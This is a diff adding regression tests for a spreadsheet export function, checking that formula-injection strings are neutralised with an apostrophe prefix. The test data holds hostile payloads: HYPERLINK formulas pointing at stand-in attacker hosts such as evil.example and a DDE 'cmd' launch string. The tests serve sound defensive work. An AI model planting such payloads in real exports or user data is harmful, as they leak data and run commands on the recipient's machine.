@@ -123,6 +123,82 @@ class TestExportToExcel:
         assert "FR" in values
 
 
+class TestFormulaInjection:
+    """Codex P0: ``=HYPERLINK(...)`` smuggled through user-supplied strings
+    (e.g. ancillary CSV ``product``, forward CSV ``contract``) used to be
+    written to xlsx as a formula and would execute when the recipient
+    opened the export. Sanitize at the cell-write boundary.
+    """
+
+    def test_leading_whitespace_bypass_is_caught(
+        self, tmp_path: Path, sample_data,
+    ) -> None:
+        """Gemini-3.1 P0 follow-up: an earlier sanitiser only inspected
+        ``value[0]``, so `' =BAD'` (leading space) sailed past — Excel and
+        Calc evaluate the formula regardless. The strip-then-check fix
+        must catch this case AND a leading-tab variant.
+        """
+        from src.export import export_to_excel
+        price_df, _daily_orig, monthly, pctls, rev, neg = sample_data
+        daily = pd.DataFrame({
+            "date": pd.date_range("2025-01-01", periods=3),
+            "label": [
+                ' =HYPERLINK("//evil/", "x")',  # leading space
+                '\t=cmd|\'/C calc\'!A1',         # leading tab
+                "harmless",
+            ],
+            "spread": [10.0, 11.0, 12.0],
+        })
+        path = export_to_excel(
+            zone="DE_LU", price_df=price_df, daily_spreads=daily,
+            monthly_spreads=monthly, percentiles=pctls, revenue_estimate=rev,
+            negative_stats=neg, output_path=tmp_path / "ws.xlsx",
+        )
+        wb = load_workbook(path)
+        ws = wb["Daily Spreads"]
+        headers = [c.value for c in ws[1]]
+        col = headers.index("label") + 1
+        for row in (2, 3):
+            cell = ws.cell(row=row, column=col)
+            assert cell.data_type != "f", (
+                f"row {row}: whitespace-bypass payload was written as formula"
+            )
+            assert isinstance(cell.value, str)
+            assert cell.value.startswith("'"), (
+                f"row {row}: cell value {cell.value!r} not prefixed"
+            )
+
+    def test_formula_trigger_prefixed_with_apostrophe(
+        self, tmp_path: Path, sample_data,
+    ) -> None:
+        from src.export import export_to_excel
+        price_df, _daily_orig, monthly, pctls, rev, neg = sample_data
+        # Inject a formula-trigger string into a user-flowed column on a
+        # daily-spreads frame. The xlsx writer must neutralise it.
+        daily = pd.DataFrame({
+            "date": pd.date_range("2025-01-01", periods=2),
+            "label": ['=HYPERLINK("//evil.example/leak", "x")', "harmless"],
+            "spread": [10.0, 12.0],
+        })
+        path = export_to_excel(
+            zone="DE_LU", price_df=price_df, daily_spreads=daily,
+            monthly_spreads=monthly, percentiles=pctls, revenue_estimate=rev,
+            negative_stats=neg, output_path=tmp_path / "inj.xlsx",
+        )
+        wb = load_workbook(path)
+        ws = wb["Daily Spreads"]
+        headers = [c.value for c in ws[1]]
+        label_col = headers.index("label") + 1
+        injected = ws.cell(row=2, column=label_col)
+        # openpyxl writes formula cells with data_type='f'. After
+        # sanitisation, the cell must be text ('s') and start with "'".
+        assert injected.data_type != "f", (
+            "leading '=' was written as a formula; sanitiser regressed"
+        )
+        assert isinstance(injected.value, str)
+        assert injected.value.startswith("'=")
+
+
 class TestExportToBytes:
     def test_returns_bytes(self, sample_data) -> None:
         price_df, daily, monthly, pctls, rev, neg = sample_data
